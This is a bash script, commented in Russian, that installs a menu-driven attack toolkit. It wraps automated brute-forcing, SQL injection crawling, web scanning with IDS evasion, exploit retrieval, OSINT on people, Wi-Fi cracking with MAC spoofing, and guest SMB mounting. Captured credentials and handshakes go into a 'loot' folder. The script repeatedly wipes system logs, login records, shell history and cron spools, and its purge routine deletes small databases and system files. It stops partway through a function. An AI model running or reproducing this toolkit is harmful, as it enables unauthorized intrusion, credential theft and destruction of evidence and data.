#!/bin/bash


CURRENT_VERSION="7.7"
# VERSION CURRENT_VERSION (Rescue & Sterile Edition)

TARGET_FILE="/usr/local/bin/kali_pro"
# Глобальные параметры стерильности
INSTALL_FLAGS="-y --no-install-recommends"
PROGRESS_OPTS="-o Dpkg::Progress-Fancy=1 -o APT::Color=1"
CLEAN_OPTS="-o DPkg::Post-Invoke={'apt-get clean';} -o APT::Keep-Downloaded-Packages=false"

# --- ОБРАБОТКА ФОНОВЫХ КОМАНД ---
if [[ "$1" == "--purge-silent" ]]; then
    deep_purge > /dev/null 2>&1
    exit 0
fi

if [[ "$1" == "--update-silent" ]]; then
    update_kali > /dev/null 2>&1
    exit 0
fi


create_files() {
    cat << 'EOF' > "$TARGET_FILE"
#!/bin/bash
# VERSION=CURRENT_VERSION
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

LOOT_DIR="$HOME/arsenal_loot"
mkdir -p "$LOOT_DIR"

# Локальные переменные внутри арсенала
INSTALL_FLAGS="-y --no-install-recommends"
PROGRESS_OPTS="-o Dpkg::Progress-Fancy=1 -o APT::Color=1"
CLEAN_OPTS="-o DPkg::Post-Invoke={'apt-get clean';} -o APT::Keep-Downloaded-Packages=false"

run_smart_check() {
pgrep cron > /dev/null || cron &>/dev/null
    # Фоновая мини-очистка при каждом обновлении меню
    apt-get clean >/dev/null 2>&1
    python3 -c "
import shutil
def get_status(path, label):
    try:
        total, used, free = shutil.disk_usage(path)
        def fmt(b):
            if b >= 1024**3: return f'{b/1024**3:.1f}G'
            return f'{b//1024**2}MB'
        status = '\033[0;32mOK' if free > (350*1024**2) else '\033[0;31mLOW'
        print(f'   \033[0;34m[ {label} ]:\033[0m {fmt(free)} / {fmt(total)} ({status}\033[0m)')
    except: pass
get_status('/', 'СИСТЕМА')
"
}

# --- FUNCTIONS v3.6 ---

# --- MODULE: SMART SCAN v6.7 (ELITE-HEURISTIC) ---
smart_nmap() {
    echo -ne "${YELLOW}Target: ${NC}"
    read -r t
    [[ -z "$t" ]] && return

    echo -e "${BLUE}[*] Initializing Autonomous Heuristics...${NC}"
    
    # 1. ПРОВЕРКА ДОСТУПНОСТИ (Fast Ping)
    # Если хост не пингуется, добавляем флаг -Pn автоматически
    if ! ping -c 1 -W 1 "$t" >/dev/null 2>&1; then
        echo -e "${RED}[!] Host not responding to ping. Switching to -Pn mode.${NC}"
        OPTS="-Pn"
    else
        OPTS=""
    fi

    # 2. ЭВРИСТИЧЕСКИЙ АНАЛИЗ (Top 1000 ports + Service Detect)
    # --min-rate 1000: Ускоряет скан, не теряя качества на Samsung
    # --max-retries 1: Предотвращает зацикливание на плохих пакетах
    echo -e "${CYAN}[*] Extracting final intelligence...${NC}"
    
    RESULT=$(nmap $OPTS -sV --open --min-rate 1000 --max-retries 1 "$t" 2>/dev/null | grep -E "^[0-9]+/tcp|PORT")

    # 3. ФИНАЛЬНЫЙ ВЫВОД (Zero Trace)
    if [[ -z "$RESULT" ]]; then
        echo -e "${RED}[-] Intelligence Gap: No open ports discovered.${NC}"
    else
        echo -e "${GREEN}=== FINAL INTELLIGENCE REPORT ===${NC}"
        echo -e "$RESULT" | sed 's/open/  [ACTIVE]/g' # Красивое форматирование статуса
        echo -e "${GREEN}=================================${NC}"
    fi
    
    # Очистка памяти
    unset RESULT
    echo -ne "\n${YELLOW}Press ENTER to return...${NC}"
    read -r
}


# --- MODULE: SMART EXPLOIT SEARCH v6.7 (HEURISTIC) ---
smart_searchsploit() {
    echo -ne "${YELLOW}Autonomous Query (e.g. SMB windows): ${NC}"
    read -r q
    [[ -z "$q" ]] && return

    echo -e "${BLUE}[*] Heuristic Database Analysis active...${NC}"
    
    # 1. АВТОНОМНЫЙ ФИЛЬТР: Убираем DOS-атаки и оставляем только RCE/PrivEsc (Remote/Local)
    # 2. ОГРАНИЧЕНИЕ: Только 15 самых релевантных совпадений для экрана Samsung
    RAW_DATA=$(searchsploit -t "$q" 2>/dev/null | grep -E "Exploit Title|---| [0-9]" | grep -iv "dos" | head -n 18)

    if [[ -z "$RAW_DATA" ]]; then
        echo -e "${RED}[-] No high-priority exploits found for '$q'.${NC}"
    else
        echo -e "${GREEN}=== TOP RELEVANT EXPLOITS ===${NC}"
        echo -e "$RAW_DATA"
        echo -e "${GREEN}=============================${NC}"
    fi

    echo -ne "\n${MAGENTA}Enter ID to Extract (or PRESS ENTER): ${NC}"
    read -r id

    if [[ -n "$id" ]]; then
        # АВТОНОМНОЕ ДЕЙСТВИЕ: Копируем, переименовываем в читаемый вид и даем права
        # Находим путь к файлу через ID, чтобы вытащить расширение (.py, .c, .txt)
        FILE_PATH=$(searchsploit -p "$id" 2>/dev/null | grep "$id" | awk '{print $2}' | head -n 1)
        EXT="${FILE_PATH##*.}"
        
        if [[ -n "$FILE_PATH" ]]; then
            # Скрытое копирование в оперативную память (для Zero Trace) или в LOOT
            searchsploit -m "$id" >/dev/null 2>&1
            # Переименовываем для удобства (например, exploit_45678.py)
            mv *.${EXT} "$LOOT_DIR/exploit_${id}.${EXT}" 2>/dev/null
            chmod +x "$LOOT_DIR/exploit_${id}.${EXT}" 2>/dev/null
            
            echo -e "${GREEN}[+] Intelligence Extracted: LOOT/exploit_${id}.${EXT}${NC}"
        else
            echo -e "${RED}[!] Invalid Exploit ID.${NC}"
        fi
    fi

    # Стираем временные переменные для стерильности RAM
    unset RAW_DATA FILE_PATH EXT
    echo -ne "\n${CYAN}Press ENTER to return...${NC}"
    read -r
}


# --- MODULE: SMART BRUTEFORCE v6.7 (ELITE) ---
smart_hydra() {
    echo -ne "${YELLOW}Target IP: ${NC}"; read -r t
    echo -ne "${YELLOW}Username:  ${NC}"; read -r u
    echo -ne "${YELLOW}Protocol (ssh/ftp/http-get): ${NC}"; read -r p
    [[ -z "$t" || -z "$u" || -z "$p" ]] && return

    # 1. ЭВРИСТИКА ПОТОКОВ (Оптимизация под Samsung)
    # На мобильном устройстве слишком много потоков убивают сеть.
    # Если протокол SSH — ставим 4 потока (защита от бана), иначе 16.
    THREADS=16
    [[ "$p" == "ssh" ]] && THREADS=4

    echo -e "${BLUE}[*] Initializing Autonomous Attack ($p) на $t...${NC}"
    echo -e "${CYAN}[*] Using adaptive threading: $THREADS tasks${NC}"

    # 2. АВТОНОМНОЕ ИСПОЛНЕНИЕ (Zero Logs on Disk)
    # Мы пропускаем вывод через grep, чтобы видеть только найденный пароль в реальном времени.
    # Все ошибки и системный мусор Hydra направляем в /dev/null.
    
    echo -e "${MAGENTA}--- ATTACK PROGRESS ---${NC}"
    
    # -f: выход при первом найденном пароле
    # -u: проверка всех сервисов на одном порту
    # -V: вывод прогресса (фильтруем через grep)
    RESULT=$(hydra -l "$u" -P /usr/share/wordlists/rockyou.txt -t $THREADS -f -u "$t" "$p" -V 2>/dev/null | grep -E "login:|password:|host:")

    # 3. ФИНАЛЬНЫЙ АНАЛИЗ (Intelligence Output)
    if [[ -z "$RESULT" ]]; then
        echo -e "${RED}[-] Attack finished: Credentials not found or Service unreachable.${NC}"
    else
        echo -e "\n${GREEN}=== SUCCESS: INTELLIGENCE CAPTURED ===${NC}"
        echo -e "$RESULT"
        echo -e "${GREEN}======================================${NC}"
        # Предлагаем сохранить только если результат есть
        echo -ne "${YELLOW}Save to Loot? (y/N): ${NC}"; read -r save
        [[ "$save" == "y" ]] && echo "$t $p $u -> $RESULT" >> "$LOOT_DIR/credentials.txt"
    fi

    # Стерилизация RAM
    unset RESULT THREADS
    echo -ne "\n${CYAN}Press ENTER to return...${NC}"
    read -r
}


# --- MODULE: SMART SQL INJECTION v6.8 (ELITE-HEURISTIC) ---
smart_sqlmap() {
    echo -ne "${YELLOW}Target (URL/IP): ${NC}"
    read -r target
    [[ -z "$target" ]] && return

    # 1. АВТО-КОРРЕКЦИЯ: Превращаем IP в URL
    if [[ "$target" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        echo -e "${CYAN}[*] IP detected. Normalizing to http://$target/${NC}"
        target="http://$target/"
    fi

    echo -e "${BLUE}[*] Initializing Autonomous Probe...${NC}"
    
    # 2. ПАРАМЕТРЫ ЭВРИСТИКИ
    # --crawl=2: Если нет параметров (?id=), sqlmap сам ищет ссылки на сайте
    # --forms: Тестировать формы ввода (логин, поиск)
    # --batch: Полный автомат
    # --output-dir: Временная папка в RAM
    
    TEMP_SQL="/tmp/sqlmap_$(date +%s)"
    
    echo -e "${MAGENTA}--- CRAWLING & PROBING ACTIVE ---${NC}"
    
    # Запуск с "умным" поиском параметров
    sqlmap -u "$target" --batch --random-agent --smart \
           --level 2 --risk 2 --threads 5 \
           --crawl=2 --forms \
           --output-dir="$TEMP_SQL" \
           --purge --cleanup 2>/dev/null

    # 3. АНАЛИЗ РЕЗУЛЬТАТОВ
    LOG_FILE=$(find "$TEMP_SQL" -name "log" 2>/dev/null)

    if [[ -f "$LOG_FILE" ]]; then
        echo -e "\n${GREEN}=== VULNERABILITY FOUND ===${NC}"
        grep -E "target URL|Type:|Title:|Payload:" "$LOG_FILE"
        
        echo -ne "\n${YELLOW}Save intelligence to LOOT? (y/N): ${NC}"; read -r sync
        [[ "$sync" == "y" ]] && cp -r "$TEMP_SQL"/* "$LOOT_DIR/sql_$(date +%d%m)/" 2>/dev/null
    else
        echo -e "${RED}[-] No injection points found on this target.${NC}"
    fi

    # 4. СТЕРИЛИЗАЦИЯ
    rm -rf "$TEMP_SQL"
    unset target sync LOG_FILE TEMP_SQL
    
    echo -ne "\n${CYAN}Press ENTER to return...${NC}"
    read -r
}


# --- MODULE: SMART WEB AUDIT v6.9 (ELITE-HEURISTIC) ---
smart_nikto() {
    echo -ne "${YELLOW}Target (IP/Domain/URL): ${NC}"
    read -r t
    [[ -z "$t" ]] && return

    # 1. АВТОНОМНАЯ ЭВРИСТИКА ЦЕЛИ
    # Умная проверка: если порт не указан, проверяем 443, затем 80.
    # Если это чистый IP, делаем его URL.
    if [[ "$t" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || [[ ! "$t" =~ ^http ]]; then
        echo -e "${CYAN}[*] Port Heuristics: Checking SSL (443) availability...${NC}"
        if nc -z -w 2 "${t%:*}" 443 2>/dev/null; then
            target="https://$t"
        else
            target="http://$t"
        fi
    else
        target="$t"
    fi

    echo -e "${BLUE}[*] Launching Autonomous Probe on: $target${NC}"
    
    # 2. АДАПТИВНЫЙ ТЮНИНГ
    # -evasion 1: Инкапсуляция запросов (обход простых IDS)
    # -Tuning 12345bc: Фокус на критику (RCE, XSS, Auth)
    # -Cdr: Проверка конкретных путей, если корень пуст
    
    echo -e "${CYAN}[*] Mode: Stealth Audit / Time-Limit: 180s${NC}"
    
    # 3. ИСПОЛНЕНИЕ В RAM (Zero-Trace)
    # Используем переменную для фильтрации, чтобы диск не "проснулся"
    echo -e "${MAGENTA}-------------------------------------------${NC}"
    
    # Добавляем -Display V, чтобы видеть только векторы атак
    RAW_INTEL=$(nikto -h "$target" -Tuning 12345bc -nointeractive -maxtime 180s -evasion 1 -Display V 2>/dev/null \
                | grep -E "OSVDB|Interesting|Target|Server:|Vulnerability|Web-Server")

    # 4. ФИНАЛЬНЫЙ АНАЛИЗ
    if [[ -z "$RAW_INTEL" ]]; then
        echo -e "${RED}[-] No high-risk vectors identified in 180s window.${NC}"
    else
        echo -e "${GREEN}=== CRITICAL INTELLIGENCE REPORT ===${NC}"
        # Эвристическая подсветка: OSVDB - критично (красный), Interesting - внимание (желтый)
        echo -e "$RAW_INTEL" | sed -e "s/OSVDB/${RED}OSVDB${NC}/g" -e "s/Interesting/${YELLOW}INTERESTING${NC}/g"
        echo -e "${GREEN}====================================${NC}"
        
        echo -ne "\n${YELLOW}Extract findings to LOOT? (y/N): ${NC}"; read -r sync
        if [[ "$sync" == "y" ]]; then
            # Пишем только чистый результат без мусора
            echo -e "[$(date)] REPORT: $target\n$RAW_INTEL\n" >> "$LOOT_DIR/web_exploits.txt"
            echo -e "${GREEN}[+] Intel captured.${NC}"
        fi
    fi

    # 5. СТЕРИЛИЗАЦИЯ
    unset t target RAW_INTEL sync
    echo -ne "\n${CYAN}Press ENTER to return...${NC}"
    read -r
}


# --- MODULE: SMART INSTALLER v6.9 (ZERO-LOG) ---
smart_installer() {
    echo -ne "${YELLOW}Package to install: ${NC}"
    read -r pkg
    [[ -z "$pkg" ]] && return

    # 1. ПРОВЕРКА БЕЗ СЛЕДОВ
    if dpkg -l "$pkg" >/dev/null 2>&1; then
        echo -e "${CYAN}[i] '$pkg' already exists. Operation skipped.${NC}"
        return
    fi

    echo -e "${BLUE}[*] Initializing Stealth Environment...${NC}"
    
    # Исправляем прошлые ошибки молча
    dpkg --configure -a >/dev/null 2>&1

    # 2. УСТАНОВКА С ПОДАВЛЕНИЕМ ЛОГОВ
    # Обновляем индексы в RAM
    if apt-get update -qq; then
        echo -e "${GREEN}[+] Index ready. Deploying: $pkg${NC}"
        
        # DEBIAN_FRONTEND=noninteractive: убирает вопросы
        # -o Dir::Cache::archives="/tmp": качаем deb-пакеты в RAM, а не на диск
        # -o APT::Keep-Downloaded-Packages="false": не сохраняем скачанное
        DEBIAN_FRONTEND=noninteractive apt-get install -y -q \
            -o Dir::Cache::archives="/tmp" \
            -o APT::Keep-Downloaded-Packages="false" "$pkg"
        
        if [[ $? -eq 0 ]]; then
            # 3. ТОТАЛЬНАЯ ЗАЧИСТКА (Zero-Log & Zero-Waste)
            echo -e "${YELLOW}[*] Purging all traces and logs...${NC}"
            
            # Очистка системных журналов установки
            truncate -s 0 /var/log/apt/history.log 2>/dev/null
            truncate -s 0 /var/log/apt/term.log 2>/dev/null
            truncate -s 0 /var/log/dpkg.log 2>/dev/null
            
            # Удаление временных индексов и кэша
            apt-get clean >/dev/null 2>&1
            rm -rf /var/lib/apt/lists/*
            rm -rf /tmp/*.deb 2>/dev/null
            
            echo -e "${GREEN}[+] Success. $pkg is live. No traces remain.${NC}"
        else
            echo -e "${RED}[!] Deployment failed.${NC}"
        fi
    else
        echo -e "${RED}[-] Repositories unreachable.${NC}"
    fi

    unset pkg
    echo -ne "\n${CYAN}Press ENTER...${NC}"
    read -r
}

# --- MODULE: SMART CLEAN & UPGRADE v6.9 (AUTONOMOUS) ---
clean_system() {
    echo -e "${CYAN}=== SYSTEM INTELLIGENCE MAINTENANCE (v6.9) ===${NC}"
    
    # 1. ЭВРИСТИЧЕСКИЙ АНАЛИЗ ОБНОВЛЕНИЙ
    # Обновляем индексы в RAM (/tmp), чтобы не мусорить на диске
    apt-get update -qq -o Dir::Cache::archives="/tmp"
    
    UPGRADES=$(apt-get upgrade -s | grep -P '^\d+ upgraded' | awk '{print $1}')
    
    if [[ "$UPGRADES" =~ ^[0-9]+$ ]] && [ "$UPGRADES" -gt 0 ]; then
        echo -e "${BLUE}[!] Detected $UPGRADES critical upgrades. Processing...${NC}"
        # DEBIAN_FRONTEND=noninteractive исключает зависания на запросах
        DEBIAN_FRONTEND=noninteractive apt-get full-upgrade -y -q
    else
        echo -e "${GREEN}[+] System core is up to date.${NC}"
    fi

    # 2. ГЛУБОКАЯ СТЕРИЛИЗАЦИЯ (Zero-Log Strategy)
    echo -e "${YELLOW}[*] Executing deep sanitation...${NC}"
    
    # Удаляем неиспользуемые зависимости и их конфиги
    apt-get autoremove --purge -y -qq >/dev/null 2>&1
    apt-get autoclean -y >/dev/null 2>&1
    
    # Обнуляем логи, чтобы скрыть следы активности (и освободить место)
    # Это ключевой момент для "автономности" и скрытности
    find /var/log -type f -exec truncate -s 0 {} \;
    
    # Очистка временных директорий и индексов apt (самый жирный мусор)
    rm -rf /var/lib/apt/lists/*
    rm -rf /tmp/*
    rm -rf ~/.cache/*
    
    # 3. ПРОВЕРКА ФАЙЛОВОЙ СИСТЕМЫ
    # Исправляем возможные ошибки dpkg, которые могли возникнуть в фоне
    dpkg --configure -a >/dev/null 2>&1

    echo -e "${GREEN}=== OPTIMIZATION COMPLETE: SYSTEM IS STERILE ===${NC}"
    unset UPGRADES
    sleep 2
}

# --- MODULE: SMART OSINT v7.1 (AUTONOMOUS DISPATCHER) ---
run_sherlock() {
    echo -ne "${YELLOW}Target (Nick/Email/Phone): ${NC}"
    read -r input
    [[ -z "$input" ]] && return

    # 1. ЭВРИСТИЧЕСКИЙ АНАЛИЗ И КЛАССИФИКАЦИЯ
    # Удаляем лишние пробелы и символы, если они случайно попали при вставке
    target=$(echo "$input" | tr -d '[:space:]')

    if [[ "$target" =~ ^\+?[0-9]{10,15}$ ]]; then
        # РАСПОЗНАН НОМЕР ТЕЛЕФОНА
        echo -e "${MAGENTA}[!] Phone Number format detected.${NC}"
        echo -e "${YELLOW}[i] Logic: Sherlock is designed for strings, not digits.${NC}"
        echo -e "${CYAN}[*] Recommendation: Use PhoneInfoga or Telegram Bot 'Eye of God'.${NC}"
        
        # Эвристика: пробуем найти ник по международному формату (иногда срабатывает)
        echo -ne "${BLUE}Attempt to search as string anyway? (y/N): ${NC}"; read -r opt
        [[ "$opt" != "y" ]] && return
        nick="$target"

    elif [[ "$target" =~ ^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}$ ]]; then
        # РАСПОЗНАН EMAIL
        echo -e "${MAGENTA}[!] Email format detected.${NC}"
        # Эвристика: извлекаем часть до '@' (самый частый никнейм пользователя)
        nick="${target%%@*}"
        echo -e "${CYAN}[*] Smart extraction: Searching for nickname '$nick'...${NC}"
    
    else
        # РАСПОЗНАН НИКНЕЙМ / СТРОКА
        nick="$target"
    fi

    echo -e "${BLUE}[*] Launching Autonomous Probe for: $nick...${NC}"
    
    # 2. ИСПОЛНЕНИЕ (RAM-Only / Stealth Mode)
    # Создаем временный файл в RAM, чтобы не оставлять следов на SSD Samsung
    TEMP_REPORT="/tmp/osint_$(date +%s).txt"
    
    echo -e "${CYAN}[*] Search parameters: Timeout 3s / Top Sites Only${NC}"
    echo -e "${MAGENTA}-------------------------------------------${NC}"

    # Sherlock в режиме невидимости:
    # --timeout 3: обрезаем долгие ожидания
    # --print-found: только успешные попадания
    # --no-color: для чистоты последующего парсинга
    sherlock "$nick" --timeout 3 --print-found --no-color > "$TEMP_REPORT" 2>/dev/null

    # 3. ФИНАЛЬНЫЙ ИНТЕЛЛЕКТ (Intelligence Extraction)
    RESULT=$(grep -E "http" "$TEMP_REPORT")

    if [[ -z "$RESULT" ]]; then
        echo -e "${RED}[-] No direct matches found in standard digital clusters.${NC}"
    else
        echo -e "${GREEN}=== TARGET FOOTPRINT CAPTURED ===${NC}"
        # Вывод очищенных ссылок
        echo -e "$RESULT"
        echo -e "${GREEN}=================================${NC}"
        
        echo -ne "\n${YELLOW}Sync findings to LOOT? (y/N): ${NC}"; read -r sync
        if [[ "$sync" == "y" ]]; then
            echo -e "[$(date)] OSINT REPORT: $target (as $nick)\n$RESULT\n" >> "$LOOT_DIR/osint_history.txt"
            echo -e "${GREEN}[+] Intel secured in LOOT.${NC}"
        fi
    fi

    # 4. СТЕРИЛИЗАЦИЯ (Zero-Trace Cleanup)
    rm -f "$TEMP_REPORT"
    unset input target nick RESULT sync TEMP_REPORT
    
    echo -ne "\n${CYAN}Press ENTER to return...${NC}"
    read -r
}


# --- MODULE: SMART WI-FI ATTACK v6.9 (AUTONOMOUS) ---
run_wifite() {
    echo -e "${CYAN}=== WI-FI INTELLIGENCE PROBE (v6.9) ===${NC}"
    
    # 1. ЭВРИСТИЧЕСКАЯ ПРОВЕРКА ОКРУЖЕНИЯ
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] Error: Root privileges required for Monitor Mode.${NC}"
        return
    fi

    # 2. АВТОНОМНАЯ ПОДГОТОВКА (Zero-Conflict Strategy)
    # --kill: убивает процессы, мешающие мониторингу (NetworkManager, wpa_supplicant)
    # --check: проверяет наличие необходимых инструментов (hcxtools, reaver и т.д.)
    echo -e "${BLUE}[*] Sterilizing airwaves and killing conflicting processes...${NC}"
    wifite --kill >/dev/null 2>&1

    # 3. УМНЫЙ ЗАПУСК (Targeted Heuristics)
    # --dict: используем наш основной словарь, если он есть
    # --pillage: автоматический сбор всех данных после взлома
    # --no-wps: отключаем, если хочешь только WPA (или убери, если нужен полный спектр)
    # --infinite: продолжать атаку до победного
    
    echo -e "${YELLOW}[!] Ready. Starting Adaptive Capture Mode...${NC}"
    echo -e "${MAGENTA}-------------------------------------------${NC}"

    # Запускаем в интерактивном режиме, но с умными дефолтами
    # Мы перенаправляем логи в RAM (/tmp), чтобы не мусорить на диске
    wifite --dict /usr/share/wordlists/rockyou.txt \
           --pillage \
           --nodead \
           --mac # Спуфинг MAC-адреса для анонимности
           
    # 4. ФИНАЛЬНЫЙ СБОР ТРОФЕЕВ (Loot Sync)
    # Wifite сохраняет ключи в папку 'hs'. Мы переместим их в наш LOOT.
    if [ -d "hs" ]; then
        COUNT=$(ls hs | wc -l)
        if [ "$COUNT" -gt 0 ]; then
            echo -e "${GREEN}=== ATTACK SUCCESS: $COUNT HANDSHAKES CAPTURED ===${NC}"
            mkdir -p "$LOOT_DIR/wifi_keys"
            cp -r hs/* "$LOOT_DIR/wifi_keys/" 2>/dev/null
            echo -e "${GREEN}[+] Intelligence synced to LOOT/wifi_keys.${NC}"
        fi
        rm -rf hs/ 2>/dev/null
    fi

    # 5. СТЕРИЛИЗАЦИЯ И ВОССТАНОВЛЕНИЕ
    echo -e "${BLUE}[*] Restoring network services...${NC}"
    # Опционально: можно перезапустить сетевые службы, если нужно
    # service networking restart >/dev/null 2>&1
    
    echo -ne "\n${CYAN}Press ENTER to return...${NC}"
    read -r
}


# --- MODULE: SMART DEEP PURGE v6.9 (AUTONOMOUS GHOST) ---
deep_purge() {
    local silent=false
    [[ "$1" == "--purge-silent" ]] && silent=true

    # Эвристика: Проверка на root (без него глубокая очистка невозможна)
    if [[ $EUID -ne 0 ]]; then
        [[ "$silent" = false ]] && echo -e "${RED}[!] Deep Purge requires ROOT to sanitize /var and /usr.${NC}"
        return
    fi

    [[ "$silent" = false ]] && echo -e "${RED}=== INITIATING ELITE GHOST PURGE (v6.9) ===${NC}"

    # 1. АТОМАРНАЯ СТЕРИЛИЗАЦИЯ APT (RAM-Driven)
    # Мы не просто удаляем, мы обнуляем индексы, чтобы система "забыла" о репозиториях
    apt-get autoremove --purge -y -qq >/dev/null 2>&1
    apt-get clean -y -qq >/dev/null 2>&1
    rm -rf /var/lib/apt/lists/* /var/cache/apt/archives/partial/*

    # 2. ЛИКВИДАЦИЯ СТАТИЧЕСКОГО ШУМА (Zero-Disk Strategy)
    # Оставляем только критические локали (en/ru), остальное — в небытие
    [[ "$silent" = false ]] && echo -e "${YELLOW}[*] Purging Static Ballast (Docs/Icons/Fonts)...${NC}"
    (
        cd /usr/share || exit
        rm -rf doc man info locale icons fonts themes bash-completion zsh 2>/dev/null
    )

    # 3. ЭВРИСТИКА ЯЗЫКОВЫХ СРЕД (Python/Go/Ruby/Node)
    # Ищем и уничтожаем байт-код и кэши сборки по всей системе
    [[ "$silent" = false ]] && echo -e "${YELLOW}[*] Sanitizing Dev-Environments Caches...${NC}"
    find / -type d \( -name "__pycache__" -o -name ".cache" -o -name ".bundle" -o -name ".gem" \) -exec rm -rf {} + 2>/dev/null
    find /usr -name "*.pyc" -delete 2>/dev/null

    # 4. TOTAL LOG ANNIHILATION (Zero-Trace)
    # Вместо удаления (rm), используем truncate, чтобы не нарушать дескрипторы служб
    [[ "$silent" = false ]] && echo -e "${YELLOW}[*] Zeroing System Journals & Mail...${NC}"
    find /var/log -type f -exec truncate -s 0 {} \; 2>/dev/null
    rm -rf /var/log/journal/* /var/log/btmp* /var/log/wtmp* 2>/dev/null # Чистим логи входов
    rm -rf /var/mail/* /var/spool/mail/* /var/spool/cron/* 2>/dev/null

    # 5. УМНАЯ АННИГИЛЯЦИЯ БД (PostgreSQL/MySQL)
    # Если база данных не используется активно (меньше 100MB), она считается временным мусором
    for db in /var/lib/postgresql /var/lib/mysql; do
        if [ -d "$db" ]; then
            db_size=$(du -sm "$db" | awk '{print $1}')
            if [ "$db_size" -lt 100 ]; then
                [[ "$silent" = false ]] && echo -e "${RED}[!] Small DB detected ($db_size MB). Annihilating...${NC}"
                rm -rf "$db"
            fi
        fi
    done

    # 6. СТИРАНИЕ ТРОФЕЕВ И ЦИФРОВОЙ ТЕНИ
    [[ "$silent" = false ]] && echo -e "${YELLOW}[*] Erasing Session History & Loot...${NC}"
    rm -rf "$LOOT_DIR"/* ~/.cache/* ~/.local/share/recently-used.xbel 2>/dev/null
    
    # Обнуляем историю всех возможных оболочек
    truncate -s 0 ~/.bash_history ~/.zsh_history ~/.python_history 2>/dev/null
    history -c

    # 7. ФИНАЛЬНЫЙ ЭВРИСТИЧЕСКИЙ "ПОЛИШ"
    # Удаляем временные файлы и бэкапы конфигов
    find /etc -name "*.bak" -o -name "*.old" -o -name "*~" -delete 2>/dev/null
    rm -rf /tmp/* /var/tmp/* 2>/dev/null

    if [ "$silent" = false ]; then
        echo -e "${GREEN}=== GHOST PURGE COMPLETE: SYSTEM IS STERILE ===${NC}"
        echo -ne "${BLUE}[!] Reclaimed Space: ${NC}"
        df -h / | awk 'NR==2 {print $4}'
    fi
}

# --- MODULE: SMART HYBRID MOUNT v7.0 (USB/BT/ETH) ---
auto_mount_pc() {
    echo -e "${BLUE}[*] Initializing Multi-Transport Discovery...${NC}"
    local mount_pt="/mnt/pc_share"
    mkdir -p "$mount_pt"
    
    # 1. ПРОВЕРКА СОСТОЯНИЯ
    if mountpoint -q "$mount_pt"; then
        echo -e "${CYAN}[i] Resource already synchronized.${NC}"
        return 0
    fi

    # 2. ЭВРИСТИКА ТРАНСПОРТА: Bluetooth PAN (bnep0)
    # Если Bluetooth включен и сопряжен, пытаемся поднять интерфейс
    if command -v bt-network >/dev/null 2>&1; then
        echo -e "${YELLOW}[*] Checking Bluetooth PAN status...${NC}"
        # Ищем сопряженные ПК с профилем NAP/PAN
        local BT_MAC=$(bt-device -l | grep -iE "PC|Desktop|Laptop" | awk '{print $NF}' | tr -d '()' | head -n 1)
        
        if [[ -n "$BT_MAC" ]]; then
            echo -e "${CYAN}[*] Found Paired Device: $BT_MAC. Connecting to PAN...${NC}"
            bt-network -c "$BT_MAC" nap >/dev/null 2>&1 & 
            sleep 3 # Ждем инициализацию bnep0
        fi
    fi

    # 3. АДАПТИВНОЕ ОПРЕДЕЛЕНИЕ IP (Priority: USB -> BT -> ETH)
    local PC_IP
    # Проверяем интерфейсы по приоритету скорости: usb0 (USB), bnep0 (Bluetooth), eth0
    PC_IP=$(ip route show | grep -E 'usb0|rndis0|bnep0|default' | awk '{print $3}' | head -n 1)

    if [[ -z "$PC_IP" ]]; then
        echo -e "${RED}[-] Transport Failure: No active gateway (Check USB/BT Tethering).${NC}"
        return 1
    fi

    echo -e "${CYAN}[*] Target identified via $(ip route get "$PC_IP" | awk '{print $3}'): $PC_IP${NC}"

    # 4. МИКРО-ЗОНДИРОВАНИЕ (SMB Probe)
    if ! nc -z -w 3 "$PC_IP" 445 2>/dev/null; then
        echo -e "${RED}[-] SMB Service unreachable. Ensure 'File Sharing' is ON.${NC}"
        return 1
    fi

    # 5. АВТОНОМНЫЙ МАТРИЧНЫЙ ПЕРЕБОР
    local shares=("C$" "Users" "Share" "Public")
    local success=false

    for share in "${shares[@]}"; do
        # Для Bluetooth увеличиваем таймаут (timeo), так как задержки выше
        if mount -t cifs "//$PC_IP/$share" "$mount_pt" -o guest,vers=3.0,sec=ntlmv2,soft,timeo=100 2>/dev/null; then
            success=true
            echo -e "${GREEN}[+] Successfully tethered via $(ip route get "$PC_IP" | awk '{print $3}')${NC}"
            break
        fi
    done

    # 6. ФИНАЛИЗАЦИЯ
    if [ "$success" = true ]; then
        echo -e "[$(date)] MOUNT_SUCCESS: $PC_IP via $(ip route get "$PC_IP" | awk '{print $3}')" >> "$LOOT_DIR/net_history.txt"
        return 0
    else
        echo -e "${RED}[!] Access Denied. Validate Guest permissions on Host.${NC}"
        return 1
    fi
}


# --- MODULE: SMART HYBRID GUARDIAN v7.0 (AUTONOMOUS) ---
usb_guardian_smart() {
    # 1. АВТОНОМНЫЙ ДИСПЕТЧЕР НАСТРОЕК
    # Запускаем меню модема (и USB, и BT находятся там)
    am start -n com.android.settings/.Settings\$TetherSettingsActivity &>/dev/null

    local WHITELIST="22,80,443,3389,8080"
    echo -e "${BLUE}[*] Initializing Hybrid Intelligence Guardian (v7.0)...${NC}"
    
    # 2. ЭВРИСТИКА АКТИВНОГО ИНТЕРФЕЙСА
    # Проверяем rndis0 (USB) и bnep0 (Bluetooth)
    local iface
    iface=$(ip route | grep default | awk '{print $5}' | head -n 1)
    
    local target
    target=$(ip route show dev "$iface" | grep default | awk '{print $3}')

    if [[ -z "$target" ]]; then
        echo -e "${RED}[-] No active gateway detected on $iface.${NC}"
        return
    fi

    echo -e "${CYAN}[*] Transport: $iface | Target IP: $target${NC}"

    # 3. АДАПТИВНЫЙ АУДИТ (Heuristic Port Scan)
    # Для Bluetooth (bnep0) увеличиваем таймауты, так как пинг выше
    local scan_opts="-n -Pn --open --top-ports 100"
    [[ "$iface" == "bnep0" ]] && scan_opts="$scan_opts --max-rtt-timeout 500ms"

    echo -e "${YELLOW}[*] Scanning for unauthorized vectors...${NC}"
    local open_ports
    open_ports=$(nmap $scan_opts "$target" | grep "open" | awk -F'/' '{print $1}')

    # 4. ПАРАЛЛЕЛЬНОЕ ЭВРИСТИЧЕСКОЕ ПОДАВЛЕНИЕ
    for port in $open_ports; do
        [[ ",$WHITELIST," =~ ",$port," ]] && continue

        echo -e "${RED}[!!!] Suppressing vector $port on $target...${NC}"
        
